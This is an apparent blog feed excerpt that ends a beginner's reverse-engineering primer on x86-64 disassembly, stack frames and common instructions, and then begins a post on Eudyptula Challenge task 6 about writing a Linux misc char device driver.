<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='360' y='148' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='368' y='148' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='400' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='180' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='400' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='408' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='416' y='148' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='416' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='424' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='424' y='260' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='432' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='432' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='440' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='448' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='456' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='464' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='148' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='472' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='480' y='260' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='496' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='496' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='504' y='148' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='504' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='504' y='260' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='512' y='148' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='512' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='512' y='260' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='520' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='520' y='260' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='528' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='536' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='544' y='212' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='568' y='180' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='576' y='180' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='584' y='180' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='592' y='180' fill='currentColor' style='font-size:1em'>0</text>
</g>

    </svg>
  
</div>
<p>And in disassembly code, Instruction pointer will be pointing to the next instruction after <code>func2()</code> function call.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">000000000000116</span><span class="nf">a</span> <span class="err">&lt;</span><span class="no">func1</span><span class="err">&gt;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">116</span><span class="nl">a:</span>       <span class="err">55</span>                      <span class="nf">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">116</span><span class="nl">b:</span>       <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">    <span class="err">116</span><span class="nl">e:</span>       <span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">10</span>             <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">    <span class="err">1172:</span>       <span class="err">6</span><span class="nf">a</span> <span class="mi">08</span>                   <span class="no">push</span>   <span class="mi">0x8</span>
</span></span><span class="line"><span class="cl">    <span class="err">1174:</span>       <span class="err">6</span><span class="nf">a</span> <span class="mi">07</span>                   <span class="no">push</span>   <span class="mi">0x7</span>
</span></span><span class="line"><span class="cl">    <span class="err">1176:</span>       <span class="err">41</span> <span class="nf">b9</span> <span class="mi">06</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       <span class="no">mov</span>    <span class="no">r9d</span><span class="p">,</span><span class="mi">0x6</span>
</span></span><span class="line"><span class="cl">    <span class="err">117</span><span class="nl">c:</span>       <span class="err">41</span> <span class="nf">b8</span> <span class="mi">05</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       <span class="no">mov</span>    <span class="no">r8d</span><span class="p">,</span><span class="mi">0x5</span>
</span></span><span class="line"><span class="cl">    <span class="err">1182:</span>       <span class="nf">b9</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">ecx</span><span class="p">,</span><span class="mi">0x4</span>
</span></span><span class="line"><span class="cl">    <span class="err">1187:</span>       <span class="nf">ba</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="mi">0x3</span>
</span></span><span class="line"><span class="cl">    <span class="err">118</span><span class="nl">c:</span>       <span class="nf">be</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x2</span>
</span></span><span class="line"><span class="cl">    <span class="err">1191:</span>       <span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">    <span class="err">1196:</span>       <span class="nf">e8</span> <span class="mi">7</span><span class="no">e</span> <span class="no">ff</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">call</span>   <span class="mh">1119</span> <span class="p">&lt;</span><span class="no">func2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="err">119</span><span class="nl">b:</span>       <span class="err">48</span> <span class="err">83</span> <span class="nf">c4</span> <span class="mi">10</span>             <span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x10</span>                         <span class="err">&lt;</span><span class="p">---</span> <span class="no">instruction</span> <span class="no">pointer</span>
</span></span><span class="line"><span class="cl">    <span class="err">119</span><span class="nl">f:</span>       <span class="err">89</span> <span class="err">45</span> <span class="nf">fc</span>                <span class="no">mov</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x4</span><span class="p">],</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a2:</span>       <span class="err">90</span>                      <span class="nf">nop</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a3:</span>       <span class="nf">c9</span>                      <span class="no">leave</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a4:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
</span></span></code></pre></div><p>This will then increase the stack pointer by <code>0x10</code> and save return value to a local variable at <code>rbp-0x4</code> location&hellip;and then exit. This is <em>epilogue</em> for <code>func1()</code> function. And after <code>leave</code> and <code>ret</code> instructions the stack will look like as shown below:</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 648 169"
      >
      <g transform='translate(8,16)'>
<circle cx='256' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='256' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='272' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='272' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='288' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='288' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='304' cy='48' r='6' stroke='currentColor' fill='currentColor'></circle>
<circle cx='304' cy='80' r='6' stroke='currentColor' fill='currentColor'></circle>
<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='40' y='148' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='48' y='148' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>g</text>
<text text-anchor='middle' x='56' y='148' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'>h</text>
<text text-anchor='middle' x='72' y='148' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>A</text>
<text text-anchor='middle' x='80' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='88' y='148' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='96' y='148' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='104' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='232' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='232' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='116' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='116' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='116' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='116' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='384' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='116' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='116' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='416' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='116' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='424' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='116' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='432' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='116' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='448' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='116' fill='currentColor' style='font-size:1em'>u</text>
<text text-anchor='middle' x='456' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='116' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='464' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='116' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='472' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='496' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='496' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='20' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='536' y='132' fill='currentColor' style='font-size:1em'>◄</text>
<text text-anchor='middle' x='544' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='20' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='616' y='132' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='624' y='20' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='624' y='132' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='632' y='20' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='632' y='132' fill='currentColor' style='font-size:1em'>p</text>
</g>

    </svg>
  
</div>
<p>And instruction pointer will be pointing to the next instruction in <code>main()</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">00000000000011</span><span class="nf">a5</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">&gt;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a5:</span>       <span class="err">55</span>                      <span class="nf">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a6:</span>       <span class="err">48</span> <span class="err">89</span> <span class="nf">e5</span>                <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">a9:</span>       <span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">ae:</span>       <span class="nf">e8</span> <span class="no">b7</span> <span class="no">ff</span> <span class="no">ff</span> <span class="no">ff</span>          <span class="no">call</span>   <span class="mh">116a</span> <span class="p">&lt;</span><span class="no">func1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">b3:</span>       <span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>          <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>           <span class="err">&lt;</span><span class="p">---</span> <span class="no">instruction</span> <span class="no">pointer</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">b8:</span>       <span class="err">5</span><span class="nf">d</span>                      <span class="no">pop</span>    <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">    <span class="err">11</span><span class="nl">b9:</span>       <span class="nf">c3</span>                      <span class="no">ret</span>
</span></span></code></pre></div><p>This instruction will simply set the return value for this function as <code>0x0</code> and then will pop <code>rbp</code> from stack. This will collapse the <code>main()</code> function&rsquo;s stack frame and in the next instruction it&rsquo;ll return the control to whatever function called the <code>main()</code> function.</p>
<p><img loading="lazy" src="https://media.giphy.com/media/giVvDFs5deYrKCKpD4/giphy.gif#center" alt=""  />
</p>
<h2 id="some-most-common-instructions">Some most common instructions</h2>
<p>Most of the times, you&rsquo;ll see similar instructions being executed like <code>push</code>, <code>pop</code>, <code>ret</code>, <code>mov</code>, <code>add</code>, <code>sub</code>, etc.. Let&rsquo;s understand some of those which we will be seeing most of the times.</p>
<ol>
<li>
<p><code>push</code> : This simply adds the value to the top of the stack and then decrements the stack pointer. (Decrementing stack pointer means growing the stack, since stack is upside down and grows towards lower addresses)</p>
</li>
<li>
<p><code>pop</code> : Opposite to <strong>push</strong> instruction, this removes the top of the stack and increments the stack pointer.</p>
</li>
<li>
<p><code>mov</code> : This is used to move some values from one location to another. This instruction is quite versatile and can move the values from/to register, stack memory locations, etc&hellip; For example,</p>
</li>
</ol>
<ul>
<li>
<p><code>mov rax, 0x10</code> will move <code>0x10</code> constant value to <code>rax</code> register.</p>
</li>
<li>
<p><code>mov rdi, rax</code> will move the <code>rax</code> register value to <code>rdi</code> register.</p>
</li>
<li>
<p><code>mov rdi, [rax]</code> will move the value pointer by <code>rax</code> to <code>rdi</code> register. You can think of this as dereference pointer in C.</p>
</li>
<li>
<p><code>mov [rbp-0x8], rax</code> will move the value from <code>rax</code> register to memory location poined by <code>rbp-0x08</code>.</p>
</li>
</ul>
<ol start="4">
<li><code>add</code> and <code>sub</code> : adds and substracts one value from another value. For example,</li>
</ol>
<ul>
<li><code>add rax, 0x10</code> will add <code>0x10</code> to value at <code>rax</code> register. And the result will be stored in <code>rax</code> register.</li>
<li><code>sub rax, 0x10</code> wil subtract <code>0x10</code> from value at <code>rax</code> register. And the result will be stored in <code>rax</code> register.</li>
</ul>
<ol start="5">
<li>
<p><code>lea</code> : this Loads Effective Address (lea) to any destination. This is used to copy the address of the memory location to a register/stack. For example, <code>lea eax, rbp-0x8</code> will load the address of <code>rbp-0x8</code> into <code>eax</code> register.</p>
</li>
<li>
<p><code>cmp</code> : This (compare instruction) is equivalent to <strong>sub</strong> instruction, just instead of saving the result into the first argument, it updates a flag. If the value is less then 0 then the flag is set to 1 else 0. For example, <code>cmp 1, 3</code> will result in <code>-2</code> and this will set the flag to be 1.</p>
</li>
<li>
<p><code>jmp</code> : Compare instructions are usually followed by jump instructions. This will check the above set flag and jump to the address specified in the argument accordingly. There are many types of jump instructions like jump equal (<code>je</code>), jump not equal (<code>je</code>), jump greater (<code>jg</code>), jump less (<code>jl</code>), etc.. This instruction actually manipulates the instruction pointer to make the jump. If the condation matches then it&rsquo;ll take the jump by setting the instruction pointer to the memory location from the argument, else it&rsquo;ll change the instruction pointer to point to the next statement.</p>
</li>
<li>
<p><code>call</code> : This instruction calls a function. This is equivalent to <code>push eip</code> (save the next instruction on stack) followed by <code>jmp func</code>.</p>
</li>
<li>
<p><code>leave/ret</code> : This is called at the end of every function. This destroys the current stack frame by incrementing the stack pointer or by moving the stack pointer(<code>rsp</code>) to the same location pointer by base pointer (<code>rbp</code>) and then poping the base pointer. This will make the previous return address the top of the stack which will be used by <code>ret</code> to return to that address by setting <code>eip</code> to that address and eventually pop the return address from the stack.</p>
</li>
</ol>
<h2 id="conclusion">Conclusion</h2>
<p>You&rsquo;re all set! This all could be a lot to take in all at once. But atleast you now have a rudimentary grasp of how a C code is compiled and how everything functions at the low level. I hope you now have enough information and self-assurance to begin your adventures into reverse engineering.</p>
<p>Have fun!! ✌️</p>
]]></content:encoded>
    </item>
    <item>
      <title>Eudyptula Task 6</title>
      <link>https://ayedaemon.github.io/post/2022/09/eudyptula-task-6/</link>
      <pubDate>Sun, 18 Sep 2022 13:57:01 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/09/eudyptula-task-6/</guid>
      <description>Task 6 for Eudyptula challenge</description>
      <content:encoded><![CDATA[<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">This is Task 06 of the Eudyptula Challenge
</span></span><span class="line"><span class="cl">------------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Nice job with the module loading macros, those are tricky, but a very
</span></span><span class="line"><span class="cl">valuable skill to know about, especially when running across them in
</span></span><span class="line"><span class="cl">real kernel code.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Speaking of real kernel code, let&#39;s write some!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The task this time is this:
</span></span><span class="line"><span class="cl">  - Take the kernel module you wrote for task 01, and modify it to be a
</span></span><span class="line"><span class="cl">    misc char device driver.  The misc interface is a very simple way to
</span></span><span class="line"><span class="cl">    be able to create a character device, without having to worry about
</span></span><span class="line"><span class="cl">    all of the sysfs and character device registration mess.  And what a
</span></span><span class="line"><span class="cl">    mess it is, so stick to the simple interfaces wherever possible.
</span></span><span class="line"><span class="cl">  - The misc device should be created with a dynamic minor number, no
</span></span><span class="line"><span class="cl">    need running off and trying to reserve a real minor number for your
</span></span><span class="line"><span class="cl">    test module, that would be crazy.
</span></span><span class="line"><span class="cl">  - The misc device should implement the read and write functions.
</span></span><span class="line"><span class="cl">  - The misc device node should show up in /dev/eudyptula.
</span></span><span class="line"><span class="cl">  - When the character device node is read from, your assigned id is
</span></span><span class="line"><span class="cl">    returned to the caller.
</span></span><span class="line"><span class="cl">  - When the character device node is written to, the data sent to the
</span></span><span class="line"><span class="cl">    kernel needs to be checked.  If it matches your assigned id, then
</span></span><span class="line"><span class="cl">    return a correct write return value.  If the value does not match
</span></span><span class="line"><span class="cl">    your assigned id, return the &#34;invalid value&#34; error value.
</span></span><span class="line"><span class="cl">  - The misc device should be registered when your module is loaded, and
</span></span><span class="line"><span class="cl">    unregistered when it is unloaded.
</span></span><span class="line"><span class="cl">  - Provide some &#34;proof&#34; this all works properly.
</span></span></code></pre></div><h3 id="device-drivers">Device drivers??</h3>
<p>When a user adds a new part to a computer system, such a printer, the computer doesn&rsquo;t immediately understand how to connect with it and identify it. This requires some sort of translator that can mediate between the component and our operating system/Computer. These translators are called <strong>device drivers</strong>. The operating system and other software are typically instructed on how to interface with another piece of hardware by device drivers, which are typically extremely small pieces of software.</p>
<p>For example, In some laptops there is a dedicated <em>CAPSLOCK</em> LED, which toggles to indicate the state of the key itself. It seems like a really easy and straightforward concept. A key and a led are there; when the key is pressed, the led toggles; when the key is pressed again, the led toggles once more. However, There is lot more going on than what meets the eye.</p>
<p>When the <em>CAPSLOCK</em> key is pressed, userspace application that connects with the relevant mediator/translator and transmits the message to it. The translator then manages this message, analyses it, and then executes some operations on the associated hardware device (LED).</p>



<div class="goat svg-container ">
  
    <svg
      xmlns="http://www.w3.org/2000/svg"
      font-family="Menlo,Lucida Console,monospace"
      
        viewBox="0 0 432 377"
      >
      <g transform='translate(8,16)'>
<text text-anchor='middle' x='24' y='132' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='24' y='292' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='32' y='132' fill='currentColor' style='font-size:1em'>─</text>
